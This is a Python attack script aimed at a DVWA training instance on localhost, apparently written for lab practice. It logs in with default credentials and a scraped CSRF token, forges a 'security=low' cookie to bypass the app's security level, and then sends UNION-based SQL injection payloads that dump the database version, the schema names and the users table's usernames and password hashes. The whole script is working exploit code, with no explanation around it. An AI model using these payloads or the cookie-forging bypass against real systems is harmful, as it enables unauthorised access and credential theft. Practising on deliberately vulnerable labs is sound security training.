
import requests
import re

# Step 1: Login to get fresh session
s = requests.Session()
login_page = s.get('http://localhost:28080/login.php')
token_match = re.search(r"user_token.*?value='([a-f0-9]+)'", login_page.text)
if token_match:
    token = token_match.group(1)
    print(f"[+] Got CSRF token: {token}")
else:
    print("[-] No CSRF token found")

login_data = {
    'username': 'admin',
    'password': 'password',
    'Login': 'Login',
    'user_token': token
}
login_resp = s.post('http://localhost:28080/login.php', data=login_data, allow_redirects=False)
print(f"[+] Login status: {login_resp.status_code}")
print(f"[+] Session cookies: {dict(s.cookies)}")

# Step 2: Override security to LOW via cookie (bypass impossible level)
s.cookies.set('security', 'low', domain='localhost', path='/')
print(f"\n[+] Forged security=low cookie")

# Step 3: SQL Injection attack - UNION-based to dump database
sqli_url = "http://localhost:28080/vulnerabilities/sqli/"
payloads = [
    # Test basic injection
    {"id": "1' OR '1'='1", "Submit": "Submit"},
    # UNION injection to get DB version
    {"id": "1' UNION SELECT version(),user()#", "Submit": "Submit"},
    # UNION injection to list databases
    {"id": "1' UNION SELECT schema_name,1 FROM information_schema.schemata#", "Submit": "Submit"},
    # UNION injection to dump users table
    {"id": "1' UNION SELECT user,password FROM dvwa.users#", "Submit": "Submit"},
]

for i, payload in enumerate(payloads):
    print(f"\n{'='*60}")
    print(f"[*] Payload {i+1}: {payload['id']}")
    print(f"{'='*60}")
    resp = s.get(sqli_url, params=payload)
    
    # Extract the relevant content (between <pre> tags)
    pre_matches = re.findall(r'<pre>(.*?)</pre>', resp.text, re.DOTALL)
    if pre_matches:
        for match in pre_matches:
            print(f"[RESULT] {match.strip()}")
    else:
        # Check if we got redirected to login
        if 'Login' in resp.text and 'user_token' in resp.text:
            print("[-] Redirected to login - session invalid")
        else:
            print(f"[-] No <pre> output. Response length: {len(resp.text)}")
            # Print first 500 chars for debugging
            print(resp.text[:500])

